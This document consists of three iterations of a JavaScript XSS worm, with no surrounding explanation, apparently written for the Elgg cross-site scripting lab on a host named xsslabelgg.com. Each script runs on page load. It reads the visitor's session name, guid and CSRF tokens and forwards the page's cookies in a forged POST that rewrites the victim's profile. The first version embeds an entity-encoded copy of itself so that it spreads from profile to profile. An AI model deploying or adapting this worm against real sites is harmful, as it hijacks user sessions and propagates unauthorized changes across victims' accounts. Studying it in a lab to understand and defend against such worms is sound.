
<script id="worm" type="text/javascript">
window.onload = function(){
//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
//and Security Token __elgg_token
// var sendurl="http://www.xsslabelgg.com/profile/"+ elgg.session.user.name +"/edit"
var sendurl="http://www.xsslabelgg.com/profile/edit"
var userName="&name="+elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
//Construct the content of your url.
// worm self-propergating payload attempt
var desc="&description=&#x0a;&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x20;&#x69;&#x64;&#x3d;&#x22;&#x77;&#x6f;&#x72;&#x6d;&#x22;&#x20;&#x74;&#x79;&#x70;&#x65;&#x3d;&#x22;&#x74;&#x65;&#x78;&#x74;&#x2f;&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x22;&#x3e;&#x0a;&#x77;&#x69;&#x6e;&#x64;&#x6f;&#x77;&#x2e;&#x6f;&#x6e;&#x6c;&#x6f;&#x61;&#x64;&#x20;&#x3d;&#x20;&#x66;&#x75;&#x6e;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x28;&#x29;&#x7b;&#x0a;&#x2f;&#x2f;&#x4a;&#x61;&#x76;&#x61;&#x53;&#x63;&#x72;&#x69;&#x70;&#x74;&#x20;&#x63;&#x6f;&#x64;&#x65;&#x20;&#x74;&#x6f;&#x20;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x20;&#x75;&#x73;&#x65;&#x72;&#x20;&#x6e;&#x61;&#x6d;&#x65;&#x2c;&#x20;&#x75;&#x73;&#x65;&#x72;&#x20;&#x67;&#x75;&#x69;&#x64;&#x2c;&#x20;&#x54;&#x69;&#x6d;&#x65;&#x20;&#x53;&#x74;&#x61;&#x6d;&#x70;&#x20;&#x5f;&#x5f;&#x65;&#x6c;&#x67;&#x67;&#x5f;&#x74;&#x73;&#x0a;&#x2f;&#x2f;&#x61;&#x6e;&#x64;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x54;&#x6f;&#x6b;&#x65;&#x6e;&#x20;&#x5f;&#x5f;&#x65;&#x6c;&#x67;&#x67;&#x5f;&#x74;&#x6f;&#x6b;&#x65;&#x6e;&#x0a;&#x2f;&#x2f;&#x20;&#x76;&#x61;&#x72;&#x20;&#x73;&#x65;&#x6e;&#x64;&#x75;&#x72;&#x6c;&#x3d;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x78;&#x73;&#x73;&#x6c;&#x61;&#x62;&#x65;&#x6c;&#x67;&#x67;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#x70;&#x72;&#x6f;&#x66;&#x69;&#x6c;&#x65;&#x2f;&#x22;&#x2b;&#x20;&#x65;&#x6c;&#x67;&#x67;&#x2e;&#x73;&#x65;&#x73;&#x73;&#x69;&#x6f;&#x6e;&#x2e;&#x75;&#x73;&#x65;&#x72;&#x2e;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x2b;&#x22;&#x2f;&#x65;&#x64;&#x69;&#x74;&#x22;&#x0a;&#x76;&#x61;&#x72;&#x20;&#x73;&#x65;&#x6e;&#x64;&#x75;&#x72;&#x6c;&#x3d;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x78;&#x73;&#x73;&#x6c;&#x61;&#x62;&#x65;&#x6c;&#x67;&#x67;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#x70;&#x72;&#x6f;&#x66;&#x69;&#x6c;&#x65;&#x2f;&#x65;&#x64;&#x69;&#x74;&#x22;&#x0a;&#x76;&#x61;&#x72;&#x20;&#x75;&#x73;&#x65;&#x72;&#x4e;&#x61;&#x6d;&#x65;&#x3d;&#x22;&#x26;&#x6e;&#x61;&#x6d;&#x65;&#x3d;&#x22;&#x2b;&#x65;&#x6c;&#x67;&#x67;&#x2e;&#x73;&#x65;&#x73;&#x73;&#x69;&#x6f;&#x6e;&#x2e;&#x75;&#x73;&#x65;&#x72;&#x2e;&#x6e;&#x61;&#x6d;&#x65;&#x3b;&#x0a;&#x76;&#x61;&#x72;&#x20;&#x67;&#x75;&#x69;&#x64;&#x3d;&#x22;&#x26;&#x67;&#x75;&#x69;&#x64;&#x3d;&#x22;&#x2b;&#x65;&#x6c;&#x67;&#x67;&#x2e;&#x73;&#x65;&#x73;&#x73;&#x69;&#x6f;&#x6e;&#x2e;&#x75;&#x73;&#x65;&#x72;&#x2e;&#x67;&#x75;&#x69;&#x64;&#x3b;&#x0a;&#x76;&#x61;&#x72;&#x20;&#x74;&#x73;&#x3d;&#x22;&#x26;&#x5f;&#x5f;&#x65;&#x6c;&#x67;&#x67;&#x5f;&#x74;&#x73;&#x3d;&#x22;&#x2b;&#x65;&#x6c;&#x67;&#x67;&#x2e;&#x73;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x2e;&#x74;&#x6f;&#x6b;&#x65;&#x6e;&#x2e;&#x5f;&#x5f;&#x65;&#x6c;&#x67;&#x67;&#x5f;&#x74;&#x73;&#x3b;&#x0a;&#x76;&#x61;&#x72;&#x20;&#x74;&#x6f;&#x6b;&#x65;&#x6e;&#x3d;&#x22;&#x26;&#x5f;&#x5f;&#x65;&#x6c;&#x67;&#x67;&#x5f;&#x74;&#x6f;&#x6b;&#x65;&#x6e;&#x3d;&#x22;&#x2b;&#x65;&#x6c;&#x67;&#x67;&#x2e;&#x73;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x2e;&#x74;&#x6f;&#x6b;&#x65;&#x6e;&#x2e;&#x5f;&#x5f;&#x65;&#x6c;&#x67;&#x67;&#x5f;&#x74;&#x6f;&#x6b;&#x65;&#x6e;&#x3b;&#x0a;&#x2f;&#x2f;&#x43;&#x6f;&#x6e;&#x73;&#x74;&#x72;&#x75;&#x63;&#x74;&#x20;&#x74;&#x68;&#x65;&#x20;&#x63;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x20;&#x6f;&#x66;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x75;&#x72;&#x6c;&#x2e;&#x0a;&#x76;&#x61;&#x72;&#x20;&#x64;&#x65;&#x73;&#x63;&#x3d;&#x22;&#x26;&#x64;&#x65;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x3d;&#x3c;&#x70;&#x3e;&#x4a;&#x53;&#x59;&#x69;&#x70;&#x70;&#x69;&#x65;&#x3c;&#x2f;&#x70;&#x3e;&#x0d;&#x0a;&#x22;&#x3b;&#x0a;&#x64;&#x65;&#x73;&#x63;&#x20;&#x2b;&#x3d;&#x22;&#x26;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x6c;&#x65;&#x76;&#x65;&#x6c;&#x5b;&#x64;&#x65;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x5d;&#x3d;&#x32;&#x26;&#x62;&#x72;&#x69;&#x65;&#x66;&#x64;&#x65;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x26;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x6c;&#x65;&#x76;&#x65;&#x6c;&#x5b;&#x62;&#x72;&#x69;&#x65;&#x66;&#x64;&#x65;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x5d;&#x3d;&#x32;&#x26;&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x26;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x6c;&#x65;&#x76;&#x65;&#x6c;&#x5b;&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5d;&#x3d;&#x32;&#x26;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x65;&#x73;&#x74;&#x73;&#x3d;&#x26;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x6c;&#x65;&#x76;&#x65;&#x6c;&#x5b;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x65;&#x73;&#x74;&#x73;&#x5d;&#x3d;&#x32;&#x26;&#x73;&#x6b;&#x69;&#x6c;&#x6c;&#x73;&#x3d;&#x26;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x6c;&#x65;&#x76;&#x65;&#x6c;&#x5b;&#x73;&#x6b;&#x69;&#x6c;&#x6c;&#x73;&#x5d;&#x3d;&#x32;&#x26;&#x63;&#x6f;&#x6e;&#x74;&#x61;&#x63;&#x74;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x3d;&#x26;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x6c;&#x65;&#x76;&#x65;&#x6c;&#x5b;&#x63;&#x6f;&#x6e;&#x74;&#x61;&#x63;&#x74;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x5d;&#x3d;&#x32;&#x26;&#x70;&#x68;&#x6f;&#x6e;&#x65;&#x3d;&#x26;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x6c;&#x65;&#x76;&#x65;&#x6c;&#x5b;&#x70;&#x68;&#x6f;&#x6e;&#x65;&#x5d;&#x3d;&#x32;&#x26;&#x6d;&#x6f;&#x62;&#x69;&#x6c;&#x65;&#x3d;&#x26;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x6c;&#x65;&#x76;&#x65;&#x6c;&#x5b;&#x6d;&#x6f;&#x62;&#x69;&#x6c;&#x65;&#x5d;&#x3d;&#x32;&#x26;&#x77;&#x65;&#x62;&#x73;&#x69;&#x74;&#x65;&#x3d;&#x26;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x6c;&#x65;&#x76;&#x65;&#x6c;&#x5b;&#x77;&#x65;&#x62;&#x73;&#x69;&#x74;&#x65;&#x5d;&#x3d;&#x32;&#x26;&#x74;&#x77;&#x69;&#x74;&#x74;&#x65;&#x72;&#x3d;&#x26;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x6c;&#x65;&#x76;&#x65;&#x6c;&#x5b;&#x74;&#x77;&#x69;&#x74;&#x74;&#x65;&#x72;&#x5d;&#x3d;&#x32;&#x22;&#x3b;&#x0a;&#x2f;&#x2f;&#x20;&#x76;&#x61;&#x72;&#x20;&#x63;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x3d;&#x74;&#x6f;&#x6b;&#x65;&#x6e;&#x20;&#x2b;&#x20;&#x74;&#x73;&#x20;&#x2b;&#x20;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x2b;&#x20;&#x64;&#x65;&#x73;&#x63;&#x20;&#x2b;&#x20;&#x67;&#x75;&#x69;&#x64;&#x3b;&#x20;&#x0a;&#x76;&#x61;&#x72;&#x20;&#x63;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x3d;&#x22;&#x26;&#x5f;&#x5f;&#x65;&#x6c;&#x67;&#x67;&#x5f;&#x74;&#x6f;&#x6b;&#x65;&#x6e;&#x3d;&#x7a;&#x39;&#x5f;&#x58;&#x52;&#x47;&#x79;&#x6c;&#x75;&#x36;&#x71;&#x75;&#x77;&#x61;&#x32;&#x33;&#x64;&#x48;&#x30;&#x64;&#x6a;&#x77;&#x26;&#x5f;&#x5f;&#x65;&#x6c;&#x67;&#x67;&#x5f;&#x74;&#x73;&#x3d;&#x31;&#x35;&#x37;&#x33;&#x39;&#x33;&#x35;&#x32;&#x39;&#x36;&#x26;&#x64;&#x65;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x3d;&#x3c;&#x70;&#x3e;&#x4a;&#x53;&#x53;&#x61;&#x6d;&#x69;&#x57;&#x6f;&#x72;&#x6b;&#x73;&#x21;&#x3c;&#x2f;&#x70;&#x3e;&#x0d;&#x0a;&#x26;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x6c;&#x65;&#x76;&#x65;&#x6c;&#x5b;&#x64;&#x65;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x5d;&#x3d;&#x32;&#x26;&#x62;&#x72;&#x69;&#x65;&#x66;&#x64;&#x65;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x26;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x6c;&#x65;&#x76;&#x65;&#x6c;&#x5b;&#x62;&#x72;&#x69;&#x65;&#x66;&#x64;&#x65;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x5d;&#x3d;&#x32;&#x26;&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x26;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x6c;&#x65;&#x76;&#x65;&#x6c;&#x5b;&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5d;&#x3d;&#x32;&#x26;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x65;&#x73;&#x74;&#x73;&#x3d;&#x26;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x6c;&#x65;&#x76;&#x65;&#x6c;&#x5b;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x65;&#x73;&#x74;&#x73;&#x5d;&#x3d;&#x32;&#x26;&#x73;&#x6b;&#x69;&#x6c;&#x6c;&#x73;&#x3d;&#x26;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x6c;&#x65;&#x76;&#x65;&#x6c;&#x5b;&#x73;&#x6b;&#x69;&#x6c;&#x6c;&#x73;&#x5d;&#x3d;&#x32;&#x26;&#x63;&#x6f;&#x6e;&#x74;&#x61;&#x63;&#x74;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x3d;&#x26;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x6c;&#x65;&#x76;&#x65;&#x6c;&#x5b;&#x63;&#x6f;&#x6e;&#x74;&#x61;&#x63;&#x74;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x5d;&#x3d;&#x32;&#x26;&#x70;&#x68;&#x6f;&#x6e;&#x65;&#x3d;&#x26;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x6c;&#x65;&#x76;&#x65;&#x6c;&#x5b;&#x70;&#x68;&#x6f;&#x6e;&#x65;&#x5d;&#x3d;&#x32;&#x26;&#x6d;&#x6f;&#x62;&#x69;&#x6c;&#x65;&#x3d;&#x26;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x6c;&#x65;&#x76;&#x65;&#x6c;&#x5b;&#x6d;&#x6f;&#x62;&#x69;&#x6c;&#x65;&#x5d;&#x3d;&#x32;&#x26;&#x77;&#x65;&#x62;&#x73;&#x69;&#x74;&#x65;&#x3d;&#x26;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x6c;&#x65;&#x76;&#x65;&#x6c;&#x5b;&#x77;&#x65;&#x62;&#x73;&#x69;&#x74;&#x65;&#x5d;&#x3d;&#x32;&#x26;&#x74;&#x77;&#x69;&#x74;&#x74;&#x65;&#x72;&#x3d;&#x26;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x6c;&#x65;&#x76;&#x65;&#x6c;&#x5b;&#x74;&#x77;&#x69;&#x74;&#x74;&#x65;&#x72;&#x5d;&#x3d;&#x32;&#x26;&#x67;&#x75;&#x69;&#x64;&#x3d;&#x34;&#x34;&#x22;&#x3b;&#x0a;&#x0a;&#x76;&#x61;&#x72;&#x20;&#x73;&#x61;&#x6d;&#x79;&#x47;&#x75;&#x69;&#x64;&#x3d;&#x22;&#x34;&#x32;&#x22;&#x3b;&#x0a;&#x69;&#x66;&#x28;&#x65;&#x6c;&#x67;&#x67;&#x2e;&#x73;&#x65;&#x73;&#x73;&#x69;&#x6f;&#x6e;&#x2e;&#x75;&#x73;&#x65;&#x72;&#x2e;&#x67;&#x75;&#x69;&#x64;&#x21;&#x3d;&#x73;&#x61;&#x6d;&#x79;&#x47;&#x75;&#x69;&#x64;&#x29;&#x0a;&#x7b;&#x0a;&#x2f;&#x2f;&#x43;&#x72;&#x65;&#x61;&#x74;&#x65;&#x20;&#x61;&#x6e;&#x64;&#x20;&#x73;&#x65;&#x6e;&#x64;&#x20;&#x41;&#x6a;&#x61;&#x78;&#x20;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x20;&#x74;&#x6f;&#x20;&#x6d;&#x6f;&#x64;&#x69;&#x66;&#x79;&#x20;&#x70;&#x72;&#x6f;&#x66;&#x69;&#x6c;&#x65;&#x0a;&#x76;&#x61;&#x72;&#x20;&#x41;&#x6a;&#x61;&#x78;&#x3d;&#x6e;&#x75;&#x6c;&#x6c;&#x3b;&#x0a;&#x41;&#x6a;&#x61;&#x78;&#x3d;&#x6e;&#x65;&#x77;&#x20;&#x58;&#x4d;&#x4c;&#x48;&#x74;&#x74;&#x70;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x28;&#x29;&#x3b;&#x0a;&#x41;&#x6a;&#x61;&#x78;&#x2e;&#x6f;&#x70;&#x65;&#x6e;&#x28;&#x22;&#x50;&#x4f;&#x53;&#x54;&#x22;&#x2c;&#x73;&#x65;&#x6e;&#x64;&#x75;&#x72;&#x6c;&#x2c;&#x74;&#x72;&#x75;&#x65;&#x29;&#x3b;&#x0a;&#x41;&#x6a;&#x61;&#x78;&#x2e;&#x73;&#x65;&#x74;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x48;&#x65;&#x61;&#x64;&#x65;&#x72;&#x28;&#x22;&#x48;&#x6f;&#x73;&#x74;&#x22;&#x2c;&#x22;&#x77;&#x77;&#x77;&#x2e;&#x78;&#x73;&#x73;&#x6c;&#x61;&#x62;&#x65;&#x6c;&#x67;&#x67;&#x2e;&#x63;&#x6f;&#x6d;&#x22;&#x29;&#x3b;&#x0a;&#x41;&#x6a;&#x61;&#x78;&#x2e;&#x73;&#x65;&#x74;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x48;&#x65;&#x61;&#x64;&#x65;&#x72;&#x28;&#x22;&#x43;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x2d;&#x54;&#x79;&#x70;&#x65;&#x22;&#x2c;&#x22;&#x61;&#x70;&#x70;&#x6c;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2f;&#x78;&#x2d;&#x77;&#x77;&#x77;&#x2d;&#x66;&#x6f;&#x72;&#x6d;&#x2d;&#x75;&#x72;&#x6c;&#x65;&#x6e;&#x63;&#x6f;&#x64;&#x65;&#x64;&#x22;&#x29;&#x3b;&#x0a;&#x41;&#x6a;&#x61;&#x78;&#x2e;&#x73;&#x65;&#x6e;&#x64;&#x28;&#x63;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x29;&#x3b;&#x0a;&#x7d;&#x0a;&#x7d;&#x0a;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;";
//desc +="&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2";
// var content=token + ts + name + desc + guid; 
var content="&__elgg_token=z9_XRGylu6quwa23dH0djw&__elgg_ts=1573935296&description==%3Cp%3EJSSamiWorks!%3C%2Fp%3E%0D%0A&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid=44";

var samyGuid="42";
if(elgg.session.user.guid!=samyGuid)
{
//Create and send Ajax request to modify profile
var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST",sendurl,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/"+elgg.session.user["username"]+"/edit");
content ="__elgg_ts="+ts+"&__elgg_token="+token+"&description=User-11-is-great"+"&name="+elgg.session.user["username"]+"&accesslevel[description]=2&guid="+elgg.session.user["guid"];
Ajax.send(content);
}
}
</script>







<script id="worm" type="text/javascript">
window.onload = function(){
//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
//and Security Token __elgg_token

// lets get some session data and store it into variables
var userName="&name="+elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;

// the url of the target to post the payload to
var sendurl="http://www.xsslabelgg.com/profile/" + userName + "/edit"


//Construct the content of your url.
//desc +="&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2";
// var content=token + ts + name + desc + guid; 

var content="&__elgg_token=z9_XRGylu6quwa23dH0djw&__elgg_ts=1573935296&description=%3Cp%3EJSSamiWormWorks%3C%2Fp%3E%0D%0A&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid=44";

var samyGuid="42";
if(elgg.session.user.guid!=samyGuid)
{
//Create and send Ajax request to modify profile
var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST",sendurl,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/"+elgg.session.user["username"]+"/edit");
content ="__elgg_ts="+ts+"&__elgg_token="+token+"&description=User-11-is-great"+"&name="+elgg.session.user["username"]+"&accesslevel[description]=2&guid="+elgg.session.user["guid"];
Ajax.send(content);
}
}
</script>





<script id="worm" type="text/javascript">
window.onload = function(){
//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
//and Security Token __elgg_token

// lets get some session data and store it into variables
var userName="&name="+elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;

// the url of the target to post the payload to
var sendurl="http://www.xsslabelgg.com/action/profile/edit"


var content="&__elgg_token=z9_XRGylu6quwa23dH0djw&__elgg_ts=1573935296&description=%3Cp%3EJSSamiWormWorks%3C%2Fp%3E%0D%0A&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid=44";

var samyGuid="47";
if(elgg.session.user.guid!=samyGuid)
{
//Create and send Ajax request to modify profile
var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST",sendurl,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/"+elgg.session.user["username"]+"/edit");
content ="__elgg_ts="+ts+"&__elgg_token="+token+"&description=User-11-is-great"+"&name="+elgg.session.user["username"]+"&accesslevel[description]=2&guid="+elgg.session.user["guid"];
Ajax.send(content);
}
}
</script>